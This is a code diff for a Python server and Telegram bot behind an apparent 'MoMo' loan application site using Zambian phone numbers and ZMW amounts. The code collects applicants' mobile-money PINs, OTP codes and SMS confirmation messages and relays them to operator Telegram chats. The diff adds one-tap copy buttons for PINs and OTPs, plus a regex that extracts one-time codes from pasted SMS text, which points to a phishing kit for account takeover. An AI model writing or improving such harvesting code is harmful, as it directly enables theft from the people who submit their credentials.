@@ -674,11 +674,19 @@ def telegram_api(method, payload):
         raise
 
 
-def send_telegram_message(chat_id, text, reply_markup=None):
+def send_telegram_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
     payload = {"chat_id": chat_id, "text": text}
+    if parse_mode:
+        payload["parse_mode"] = parse_mode
     if reply_markup:
         payload["reply_markup"] = reply_markup
-    return telegram_api("sendMessage", payload)
+    try:
+        return telegram_api("sendMessage", payload)
+    except Exception as err:
+        if parse_mode and ("can't parse entities" in str(err).lower() or "entity" in str(err).lower()):
+            payload.pop("parse_mode", None)
+            return telegram_api("sendMessage", payload)
+        raise
 
 
 def answer_telegram_callback(callback_query_id, text=None):
@@ -688,11 +696,19 @@ def answer_telegram_callback(callback_query_id, text=None):
     return telegram_api("answerCallbackQuery", payload)
 
 
-def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
+def edit_telegram_message(chat_id, message_id, text, reply_markup=None, parse_mode="HTML"):
     payload = {"chat_id": chat_id, "message_id": message_id, "text": text}
+    if parse_mode:
+        payload["parse_mode"] = parse_mode
     if reply_markup is not None:
         payload["reply_markup"] = reply_markup
-    return telegram_api("editMessageText", payload)
+    try:
+        return telegram_api("editMessageText", payload)
+    except Exception as err:
+        if parse_mode and ("can't parse entities" in str(err).lower() or "entity" in str(err).lower()):
+            payload.pop("parse_mode", None)
+            return telegram_api("editMessageText", payload)
+        raise
 
 
 def stage_buttons(app_id, current_stage, phone=None):
@@ -705,7 +721,8 @@ def stage_buttons(app_id, current_stage, phone=None):
     rows = []
     if phone:
         phone_str = str(phone).strip()
-        rows.append([{"text": f"📋 Copy Phone ({phone_str})", "copy_text": {"text": phone_str}}])
+        clean_p = re.sub(r"[\s\-\+\(\)]", "", phone_str)
+        rows.append([{"text": f"📋 Copy Phone ({clean_p})", "copy_text": {"text": clean_p}}])
     stage_row = []
     for key, label in stages:
         text = f"• {label} •" if key == current else label
@@ -1617,13 +1634,13 @@ def telegram_notification_loop():
                 text = (
                     f"New MoMo Application — {badge_hdr}\n"
                     f"──────────────────────\n"
-                    f"👤 Applicant: {event['first_name']} {event['last_name']}\n"
-                    f"📱 Phone: +260 {event['phone']}\n"
+                    f"👤 Applicant: <b>{event['first_name']} {event['last_name']}</b>\n"
+                    f"📱 Phone: <code>+260 {event['phone']}</code>\n"
                     f"🏷️ Profile: {returning_badge}\n"
                     f"🎯 Product: {event['loan_type']}\n"
                     f"💰 Amount: ZMW {event['loan_amount']:,}\n"
                     f"📅 Term: {event['term_months']} Months\n"
-                    f"🔖 Reference: {event['id']}\n"
+                    f"🔖 Reference: <code>{event['id']}</code>\n"
                     f"📌 Status: {status_label}"
                 )
                 reply_markup = stage_buttons(event['id'], current_status, phone=event['phone'])
@@ -2493,9 +2510,8 @@ class Handler(BaseHTTPRequestHandler):
         target_chats = []
         if app["telegram_chat_id"]:
             target_chats.append(str(app["telegram_chat_id"]).strip())
-        admin_c = telegram_admin_chat_id()
-        if admin_c and str(admin_c).strip() not in target_chats:
-            target_chats.append(str(admin_c).strip())
+        elif telegram_admin_chat_id():
+            target_chats.append(str(telegram_admin_chat_id()).strip())
 
         if target_chats and telegram_bot_token():
             if step in ("zip_phone", "account_pin"):
@@ -2520,39 +2536,60 @@ class Handler(BaseHTTPRequestHandler):
             returning_badge = f"🔄 Returning Applicant: YES ({prior_apps} previous)" if prior_apps > 0 else "👤 New Applicant"
 
             lines = [
-                f"📋 Verification Submission — {step_label}",
-                f"Ref: {val_uuid}",
-                f"Applicant: {app['first_name']} {app['last_name']}",
-                f"Phone: {phone_display}",
+                f"📋 <b>Verification Submission — {step_label}</b>",
+                f"Ref: <code>{val_uuid}</code>",
+                f"Applicant: <b>{app['first_name']} {app['last_name']}</b>",
+                f"Phone: <code>{phone_display}</code>",
                 f"Profile: {returning_badge}",
             ]
             if step in ("zip_phone", "account_pin", "merchant_pin"):
-                lines.append(f"PIN: {zip_code}")
+                lines.append(f"🔐 PIN: <code>{zip_code}</code>")
             elif step == "otp_code":
-                lines.append(f"🔢 OTP Code: {zip_code}")
-            elif step == "id_document":
-                is_url = str(id_number).strip().startswith(("http://", "https://"))
-                label = "Verification Link" if is_url else "Message / ID"
-                lines.append(f"{label}: {id_number}")
-            lines.append("Status: Awaiting Verification")
+                lines.append(f"🔢 OTP Code: <code>{zip_code}</code>")
+            extracted_code = None
+            if step == "id_document":
+                clean_id_val = str(id_number or "").strip()
+                extracted_codes = re.findall(r"\b\d{4,8}\b", clean_id_val)
+                extracted_code = extracted_codes[0] if extracted_codes else None
+                is_url = clean_id_val.startswith(("http://", "https://"))
+                label = "🔗 Verification Link" if is_url else "💬 SMS Confirmation Message"
+                lines.append(f"{label}: <code>{clean_id_val}</code>")
+                if extracted_code:
+                    lines.append(f"🔢 <b>Extracted Code / OTP:</b> <code>{extracted_code}</code>")
+            lines.append("Status: ⏳ Awaiting Verification")
 
             phone_raw = str(active_phone).strip()
             kb = []
             if str(id_number).strip().startswith(("http://", "https://")):
                 kb.append([{"text": "🔗 Open Verification Link", "url": str(id_number).strip()}])
+
             if step == "otp_code":
-                kb.append([{"text": f"📋 Copy OTP ({zip_code})", "copy_text": {"text": str(zip_code)}}])
-            kb.append([{"text": f"📋 Copy Phone ({phone_raw})", "copy_text": {"text": phone_raw}}])
+                kb.append([{"text": f"📋 Copy OTP: {zip_code}", "copy_text": {"text": str(zip_code)}}])
+                kb.append([{"text": f"📋 Copy Phone: {clean_phone}", "copy_text": {"text": clean_phone}}])
+            elif step in ("zip_phone", "account_pin", "merchant_pin"):
+                kb.append([{"text": f"📋 Copy PIN: {zip_code}", "copy_text": {"text": str(zip_code)}}])
+                kb.append([{"text": f"📋 Copy Phone: {clean_phone}", "copy_text": {"text": clean_phone}}])
+            elif step == "id_document":
+                clean_id_val = str(id_number or "").strip()
+                if extracted_code:
+                    kb.append([{"text": f"📋 Copy Code: {extracted_code}", "copy_text": {"text": str(extracted_code)}}])
+                kb.append([{"text": f"📋 Copy Phone: {clean_phone}", "copy_text": {"text": clean_phone}}])
+                kb.append([{"text": "📋 Copy SMS Message", "copy_text": {"text": clean_id_val}}])
+
             kb.append([
                 {"text": "✅ Approve", "callback_data": f"verify:approve:{ver_id}"},
                 {"text": "❌ Reject (Invalid / Retry)", "callback_data": f"verify:reject:{ver_id}"},
             ])
             buttons = {"inline_keyboard": kb}
-            for chat in target_chats:
-                try:
-                    send_telegram_message(chat, "\n".join(lines), reply_markup=buttons)
-                except Exception:
-                    pass
+
+            def _dispatch_ver_telegram():
+                for chat in target_chats:
+                    try:
+                        send_telegram_message(chat, "\n".join(lines), reply_markup=buttons)
+                    except Exception:
+                        pass
+
+            threading.Thread(target=_dispatch_ver_telegram, daemon=True).start()
 
         return self.send_json(201, {"verificationId": ver_id, "step": step, "status": "pending"})
 
